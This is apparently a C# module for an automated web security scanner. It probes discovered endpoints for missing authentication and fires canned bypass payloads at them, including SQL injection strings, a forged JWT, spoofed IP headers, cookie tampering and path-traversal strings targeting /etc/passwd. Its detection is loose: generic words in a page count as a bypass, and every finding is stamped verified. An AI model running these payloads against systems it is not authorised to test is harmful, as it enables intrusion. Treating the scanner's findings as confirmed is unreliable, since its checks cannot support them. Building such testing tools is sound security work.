using AttackAgent.Models;
using Serilog;
using System.Text.RegularExpressions;

namespace AttackAgent
{
    /// <summary>
    /// Improved Authentication bypass testing engine with context-aware detection
    /// Tests for various authentication bypass vulnerabilities and detects missing authentication
    /// </summary>
    public class ImprovedAuthBypassEngine
    {
        private readonly SecurityHttpClient _httpClient;
        private readonly ILogger _logger;
        private readonly List<AuthBypassPayload> _payloads;

        public ImprovedAuthBypassEngine()
        {
            _httpClient = new SecurityHttpClient();
            _logger = Log.ForContext<ImprovedAuthBypassEngine>();
            _payloads = InitializeAuthBypassPayloads();
        }

        /// <summary>
        /// Tests all discovered endpoints for authentication bypass vulnerabilities
        /// </summary>
        public async Task<List<Vulnerability>> TestForAuthBypassAsync(ApplicationProfile profile)
        {
            var vulnerabilities = new List<Vulnerability>();
            
            _logger.Information("🔍 Starting improved authentication bypass testing...");
            _logger.Information("Testing {EndpointCount} endpoints with {PayloadCount} auth bypass payloads", 
                profile.DiscoveredEndpoints.Count, _payloads.Count);

            foreach (var endpoint in profile.DiscoveredEndpoints)
            {
                if (!IsTestableEndpoint(endpoint))
                    continue;

                _logger.Debug("Testing endpoint: {Method} {Path}", endpoint.Method, endpoint.Path);

                var endpointVulns = await TestEndpointForAuthBypassAsync(endpoint, profile.BaseUrl);
                vulnerabilities.AddRange(endpointVulns);
            }

            _logger.Information("Improved authentication bypass testing completed. Found {VulnCount} vulnerabilities", vulnerabilities.Count);
            return vulnerabilities;
        }

        /// <summary>
        /// Tests a specific endpoint for authentication bypass vulnerabilities
        /// </summary>
        private async Task<List<Vulnerability>> TestEndpointForAuthBypassAsync(EndpointInfo endpoint, string baseUrl)
        {
            var vulnerabilities = new List<Vulnerability>();
            var url = baseUrl.TrimEnd('/') + endpoint.Path;

            // First, check if authentication is required at all
            var authAnalysis = await AnalyzeAuthenticationRequirementAsync(url, endpoint.Method);
            
            if (!authAnalysis.IsAuthenticationRequired)
            {
                // If no authentication is required, report this as a vulnerability
                var noAuthVuln = CreateNoAuthenticationVulnerability(endpoint, authAnalysis);
                vulnerabilities.Add(noAuthVuln);
                _logger.Warning("🚨 No authentication required: {Method} {Path}", endpoint.Method, endpoint.Path);
                return vulnerabilities; // Don't test bypasses if no auth is required
            }

            // If authentication is required, test for bypasses
            foreach (var payload in _payloads)
            {
                try
                {
                    var result = await TestAuthBypassAsync(url, endpoint.Method, payload);
                    
                    if (result.IsVulnerable)
                    {
                        var vulnerability = CreateAuthBypassVulnerability(endpoint, payload, result);
                        vulnerabilities.Add(vulnerability);
                        
                        _logger.Warning("🚨 Auth bypass found: {Method} {Path} with technique '{Technique}'", 
                            endpoint.Method, endpoint.Path, payload.Technique);
                    }
                }
                catch (Exception ex)
                {
                    _logger.Debug("Error testing auth bypass {Technique}: {Error}", payload.Technique, ex.Message);
                }
            }

            return vulnerabilities;
        }

        /// <summary>
        /// Analyzes if authentication is required for an endpoint
        /// </summary>
        private async Task<AuthenticationAnalysis> AnalyzeAuthenticationRequirementAsync(string url, string method)
        {
            var analysis = new AuthenticationAnalysis
            {
                IsAuthenticationRequired = false,
                Confidence = 0.0,
                Evidence = ""
            };

            try
            {
                // Get baseline response
                var baselineResponse = await GetBaselineResponseAsync(url, method);
                
                // Check for explicit authentication requirements
                if (baselineResponse.StatusCode == System.Net.HttpStatusCode.Unauthorized || 
                    baselineResponse.StatusCode == System.Net.HttpStatusCode.Forbidden)
                {
                    analysis.IsAuthenticationRequired = true;
                    analysis.Confidence = 1.0;
                    analysis.Evidence = $"Endpoint returns {baselineResponse.StatusCode}";
                    return analysis;
                }

                // Check for authentication headers
                if (baselineResponse.HasHeader("WWW-Authenticate") || 
                    baselineResponse.HasHeader("X-Auth-Required"))
                {
                    analysis.IsAuthenticationRequired = true;
                    analysis.Confidence = 0.9;
                    analysis.Evidence = "Authentication headers present";
                    return analysis;
                }

                // Check for authentication-related content
                var authRequiredIndicators = new[]
                {
                    "login", "signin", "authenticate", "unauthorized", "forbidden",
                    "access denied", "authentication required", "please login",
                    "session expired", "invalid credentials"
                };

                var authRequiredCount = 0;
                foreach (var indicator in authRequiredIndicators)
                {
                    if (baselineResponse.Contains(indicator, StringComparison.OrdinalIgnoreCase))
                    {
                        authRequiredCount++;
                    }
                }

                if (authRequiredCount > 0)
                {
                    analysis.IsAuthenticationRequired = true;
                    analysis.Confidence = Math.Min(0.8, authRequiredCount * 0.2);
                    analysis.Evidence = $"Found {authRequiredCount} authentication indicators";
                    return analysis;
                }

                // Check if this is a sensitive endpoint that should require authentication
                var sensitiveEndpoints = new[]
                {
                    "/admin", "/api/admin", "/dashboard", "/settings", "/profile",
                    "/api/users", "/api/auth", "/api/chatbot", "/api/desserts"
                };

                var isSensitiveEndpoint = sensitiveEndpoints.Any(ep => url.Contains(ep, StringComparison.OrdinalIgnoreCase));
                
                if (isSensitiveEndpoint && baselineResponse.StatusCode == System.Net.HttpStatusCode.OK)
                {
                    analysis.IsAuthenticationRequired = true;
                    analysis.Confidence = 0.7;
                    analysis.Evidence = "Sensitive endpoint accessible without authentication";
                    return analysis;
                }

                // If we get here, likely no authentication required
                analysis.IsAuthenticationRequired = false;
                analysis.Confidence = 0.8;
                analysis.Evidence = "No authentication indicators found";
            }
            catch (Exception ex)
            {
                _logger.Debug("Error analyzing authentication requirement: {Error}", ex.Message);
                analysis.IsAuthenticationRequired = false;
                analysis.Confidence = 0.0;
                analysis.Evidence = "Error during analysis";
            }

            return analysis;
        }

        /// <summary>
        /// Tests authentication bypass with specific payload
        /// </summary>
        private async Task<AuthBypassResult> TestAuthBypassAsync(string url, string method, AuthBypassPayload payload)
        {
            var result = new AuthBypassResult
            {
                Payload = payload,
                IsVulnerable = false
            };

            try
            {
                // Get baseline response (should be unauthorized)
                var baselineResponse = await GetBaselineResponseAsync(url, method);
                result.BaselineResponse = baselineResponse;

                // Test with bypass payload
                var bypassResponse = await SendAuthBypassPayloadAsync(url, method, payload);
                result.BypassResponse = bypassResponse;

                // Analyze response for bypass indicators
                result.IsVulnerable = AnalyzeResponseForAuthBypass(baselineResponse, bypassResponse, payload);

                if (result.IsVulnerable)
                {
                    result.Confidence = CalculateAuthBypassConfidence(baselineResponse, bypassResponse, payload);
                    result.Evidence = ExtractAuthBypassEvidence(bypassResponse, payload);
                }
            }
            catch (Exception ex)
            {
                _logger.Debug("Error in auth bypass test: {Error}", ex.Message);
            }

            return result;
        }

        /// <summary>
        /// Gets baseline response without bypass payload
        /// </summary>
        private async Task<HttpResponse> GetBaselineResponseAsync(string url, string method)
        {
            return method.ToUpper() switch
            {
                "GET" => await _httpClient.GetAsync(url),
                "POST" => await _httpClient.PostAsync(url, "{}"),
                "PUT" => await _httpClient.PutAsync(url, "{}"),
                "DELETE" => await _httpClient.DeleteAsync(url),
                _ => await _httpClient.GetAsync(url)
            };
        }

        /// <summary>
        /// Sends authentication bypass payload
        /// </summary>
        private async Task<HttpResponse> SendAuthBypassPayloadAsync(string url, string method, AuthBypassPayload payload)
        {
            var headers = new Dictionary<string, string>();
            var body = "{}";

            // Apply bypass technique
            switch (payload.Technique)
            {
                case "Null Byte":
                    headers["Authorization"] = payload.Payload;
                    break;
                case "SQL Injection":
                    headers["Authorization"] = payload.Payload;
                    break;
                case "JWT Manipulation":
                    headers["Authorization"] = $"Bearer {payload.Payload}";
                    break;
                case "Header Injection":
                    headers["X-Forwarded-For"] = payload.Payload;
                    headers["X-Real-IP"] = payload.Payload;
                    break;
                case "Parameter Pollution":
                    var separator = url.Contains('?') ? "&" : "?";
                    url = $"{url}{separator}{payload.Payload}";
                    break;
                case "Method Override":
                    headers["X-HTTP-Method-Override"] = "GET";
                    break;
                case "Content-Type Bypass":
                    headers["Content-Type"] = payload.Payload;
                    break;
                case "User-Agent Bypass":
                    headers["User-Agent"] = payload.Payload;
                    break;
                case "Referer Bypass":
                    headers["Referer"] = payload.Payload;
                    break;
                case "Cookie Manipulation":
                    headers["Cookie"] = payload.Payload;
                    break;
            }

            return method.ToUpper() switch
            {
                "GET" => await _httpClient.GetAsync(url, headers),
                "POST" => await _httpClient.PostAsync(url, body, headers),
                "PUT" => await _httpClient.PutAsync(url, body, headers),
                "DELETE" => await _httpClient.DeleteAsync(url, headers),
                _ => await _httpClient.GetAsync(url, headers)
            };
        }

        /// <summary>
        /// Analyzes response for authentication bypass indicators
        /// </summary>
        private bool AnalyzeResponseForAuthBypass(HttpResponse baseline, HttpResponse bypass, AuthBypassPayload payload)
        {
            // Check if we got access when we shouldn't have
            if (baseline.StatusCode == System.Net.HttpStatusCode.Unauthorized && 
                bypass.StatusCode == System.Net.HttpStatusCode.OK)
                return true;

            if (baseline.StatusCode == System.Net.HttpStatusCode.Forbidden && 
                bypass.StatusCode == System.Net.HttpStatusCode.OK)
                return true;

            // Check for different response content
            if (baseline.StatusCode == bypass.StatusCode && 
                baseline.ContentLength != bypass.ContentLength && 
                bypass.ContentLength > baseline.ContentLength)
                return true;

            // Check for specific bypass indicators
            if (ContainsBypassIndicators(bypass.Content, payload))
                return true;

            return false;
        }

        /// <summary>
        /// Checks for specific bypass indicators in response
        /// </summary>
        private bool ContainsBypassIndicators(string content, AuthBypassPayload payload)
        {
            var indicators = new[]
            {
                "admin",
                "dashboard",
                "welcome",
                "success",
                "authenticated",
                "authorized",
                "user profile",
                "account settings",
                "logout",
                "session"
            };

            return indicators.Any(indicator => 
                content.ToLower().Contains(indicator));
        }

        /// <summary>
        /// Calculates confidence level for authentication bypass
        /// </summary>
        private double CalculateAuthBypassConfidence(HttpResponse baseline, HttpResponse bypass, AuthBypassPayload payload)
        {
            var confidence = 0.5; // Base confidence

            // Higher confidence if status code changed
            if (baseline.StatusCode != bypass.StatusCode)
                confidence += 0.3;

            // Higher confidence if content length increased significantly
            if (bypass.ContentLength > baseline.ContentLength * 1.5)
                confidence += 0.2;

            return Math.Min(1.0, confidence);
        }

        /// <summary>
        /// Extracts evidence for authentication bypass
        /// </summary>
        private string ExtractAuthBypassEvidence(HttpResponse response, AuthBypassPayload payload)
        {
            var evidence = $"Successfully bypassed authentication ({response.StatusCode}); ";
            
            if (response.Contains("admin") || response.Contains("dashboard"))
                evidence += "Admin access indicators found in response";
            else if (response.Contains("success") || response.Contains("authenticated"))
                evidence += "Authentication indicators found in response";
            else
                evidence += "Response indicates successful access";

            return evidence;
        }

        /// <summary>
        /// Creates authentication bypass vulnerability
        /// </summary>
        private Vulnerability CreateAuthBypassVulnerability(EndpointInfo endpoint, AuthBypassPayload payload, AuthBypassResult result)
        {
            return new Vulnerability
            {
                Type = VulnerabilityType.AuthenticationBypass,
                Severity = SeverityLevel.Critical,
                Title = $"Authentication Bypass via {payload.Technique}",
                Description = $"Authentication bypass vulnerability found using {payload.Technique} technique.",
                Endpoint = endpoint.Path,
                Method = endpoint.Method,
                Payload = payload.Payload,
                Response = result.BypassResponse?.Content,
                Evidence = result.Evidence,
                Remediation = "Implement proper authentication and authorization checks. Validate all input parameters and headers. Use secure session management and implement proper access controls. Regularly audit authentication mechanisms and test for bypass vulnerabilities.",
                AttackMode = AttackMode.Aggressive,
                Confidence = result.Confidence,
                FalsePositive = false,
                Verified = true
            };
        }

        /// <summary>
        /// Creates no authentication vulnerability
        /// </summary>
        private Vulnerability CreateNoAuthenticationVulnerability(EndpointInfo endpoint, AuthenticationAnalysis analysis)
        {
            return new Vulnerability
            {
                Type = VulnerabilityType.WeakAuthentication,
                Severity = DetermineNoAuthSeverity(endpoint),
                Title = "No Authentication Required",
                Description = $"Endpoint {endpoint.Path} does not require authentication but may contain sensitive data or functionality.",
                Endpoint = endpoint.Path,
                Method = endpoint.Method,
                Evidence = analysis.Evidence,
                Remediation = "Implement proper authentication and authorization for sensitive endpoints. Use role-based access control and secure session management.",
                AttackMode = AttackMode.Stealth,
                Confidence = analysis.Confidence,
                FalsePositive = false,
                Verified = true
            };
        }

        /// <summary>
        /// Determines severity for no authentication vulnerability
        /// </summary>
        private SeverityLevel DetermineNoAuthSeverity(EndpointInfo endpoint)
        {
            var sensitivePaths = new[] { "/admin", "/api/admin", "/dashboard", "/settings", "/profile" };
            var apiPaths = new[] { "/api/" };
            
            if (sensitivePaths.Any(path => endpoint.Path.Contains(path, StringComparison.OrdinalIgnoreCase)))
                return SeverityLevel.Critical;
            else if (apiPaths.Any(path => endpoint.Path.Contains(path, StringComparison.OrdinalIgnoreCase)))
                return SeverityLevel.High;
            else
                return SeverityLevel.Medium;
        }

        /// <summary>
        /// Checks if endpoint is testable
        /// </summary>
        private bool IsTestableEndpoint(EndpointInfo endpoint)
        {
            // Skip static files and non-API endpoints for auth testing
            var skipPaths = new[] { ".css", ".js", ".png", ".jpg", ".ico", "/swagger" };
            return !skipPaths.Any(path => endpoint.Path.Contains(path, StringComparison.OrdinalIgnoreCase));
        }

        /// <summary>
        /// Initializes authentication bypass payloads
        /// </summary>
        private List<AuthBypassPayload> InitializeAuthBypassPayloads()
        {
            return new List<AuthBypassPayload>
            {
                new() { Technique = "Null Byte", Payload = "admin%00" },
                new() { Technique = "Null Byte", Payload = "admin\u0000" },
                new() { Technique = "SQL Injection", Payload = "admin' OR '1'='1" },
                new() { Technique = "SQL Injection", Payload = "admin'--" },
                new() { Technique = "SQL Injection", Payload = "admin' OR 1=1--" },
                new() { Technique = "JWT Manipulation", Payload = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsIm5hbWUiOiJBZG1pbiIsImlhdCI6MTUxNjIzOTAyMn0.invalid" },
                new() { Technique = "JWT Manipulation", Payload = "admin" },
                new() { Technique = "Header Injection", Payload = "127.0.0.1" },
                new() { Technique = "Header Injection", Payload = "localhost" },
                new() { Technique = "Parameter Pollution", Payload = "admin=1&user=admin" },
                new() { Technique = "Parameter Pollution", Payload = "bypass=1" },
                new() { Technique = "Method Override", Payload = "GET" },
                new() { Technique = "Content-Type Bypass", Payload = "application/x-www-form-urlencoded" },
                new() { Technique = "Content-Type Bypass", Payload = "text/plain" },
                new() { Technique = "User-Agent Bypass", Payload = "admin" },
                new() { Technique = "User-Agent Bypass", Payload = "curl/7.0" },
                new() { Technique = "Referer Bypass", Payload = "https://admin.example.com" },
                new() { Technique = "Referer Bypass", Payload = "https://localhost" },
                new() { Technique = "Cookie Manipulation", Payload = "admin=1; user=admin" },
                new() { Technique = "Cookie Manipulation", Payload = "session=admin" },
                new() { Technique = "Directory Traversal", Payload = "../../../etc/passwd" },
                new() { Technique = "Directory Traversal", Payload = "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts" }
            };
        }

        public void Dispose()
        {
            _httpClient?.Dispose();
        }
    }

    /// <summary>
    /// Authentication analysis result
    /// </summary>
    public class AuthenticationAnalysis
    {
        public bool IsAuthenticationRequired { get; set; }
        public double Confidence { get; set; }
        public string Evidence { get; set; } = string.Empty;
    }
}
